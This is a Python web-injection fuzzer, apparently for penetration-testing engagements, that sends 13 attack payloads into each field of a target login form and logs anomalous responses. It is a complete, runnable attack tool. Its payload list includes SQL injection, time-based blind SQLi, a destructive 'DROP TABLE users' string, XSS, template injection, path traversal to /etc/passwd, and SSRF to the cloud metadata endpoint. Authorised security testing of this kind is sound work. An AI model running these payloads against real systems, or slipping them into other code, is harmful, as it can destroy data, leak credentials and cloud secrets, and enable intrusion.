#!/usr/bin/env python3
"""
Injection fuzzer — 13 payloads × N form fields.
Detects anomalies in response size, timing, or content.

Usage: python3 injection-fuzzer.py
Configure TARGET, HOST, FIELDS, BASE_DATA below.
"""

import urllib.request
import urllib.parse
import json
import time

# ── Configure these for each engagement ──────────────────────────────────────
TARGET = "http://TARGET_IP/login"
HOST   = "target.com"

# Fields to fuzz — each will be tested with every payload
FIELDS = ["username", "password", "search"]

# Baseline request — all fields with known-safe values
BASE_DATA = {
    "username": "admin",
    "password": "testpassword",
    "search":   "hello",
}

OUTPUT_FILE = "pentest/dynamic/injection_anomalies.json"
# ─────────────────────────────────────────────────────────────────────────────

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "admin'--",
    "1; DROP TABLE users--",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "${7*7}",
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND SLEEP(3)--",
    "../../../etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "a" * 100,
]

HEADERS = {
    "Host": HOST,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
}

ERROR_KEYWORDS = [
    "error", "sql", "syntax", "mysql", "warning", "exception",
    "traceback", "undefined", "invalid", "fatal",
]


def request(data):
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(TARGET, data=encoded, headers=HEADERS)
    start = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read().decode(errors="replace")
        return len(body), body, time.time() - start, None
    except urllib.error.HTTPError as e:
        return 0, f"HTTP {e.code}", time.time() - start, e.code
    except Exception as e:
        return 0, str(e)[:80], time.time() - start, None


def main():
    print(f"[*] Target : {TARGET}")
    print(f"[*] Fields : {FIELDS}")
    print(f"[*] Payloads: {len(PAYLOADS)}")
    print()

    base_size, base_body, _, _ = request(BASE_DATA)
    print(f"[baseline] size={base_size}B | {base_body[:60]}")
    print()

    anomalies = []

    for field in FIELDS:
        for payload in PAYLOADS:
            data = dict(BASE_DATA)
            data[field] = payload
            size, body, elapsed, status = request(data)

            is_anomaly = (
                abs(size - base_size) > 50
                or elapsed > 3.0
                or any(k in body.lower() for k in ERROR_KEYWORDS)
            )

            tag = "[ANOMALY]" if is_anomaly else "[clean]  "
            print(f"{tag} field={field:<12} size={size:>6}B  time={elapsed:.2f}s  {body[:60]}")

            if is_anomaly:
                print(f"           payload={payload!r}")
                anomalies.append({
                    "field":   field,
                    "payload": payload,
                    "size":    size,
                    "elapsed": elapsed,
                    "body":    body[:300],
                })

    print()
    print(f"[*] Done. {len(anomalies)} anomalies.")

    with open(OUTPUT_FILE, "w") as f:
        json.dump(anomalies, f, indent=2)
    print(f"[*] Saved to {OUTPUT_FILE}")


if __name__ == "__main__":
    main()
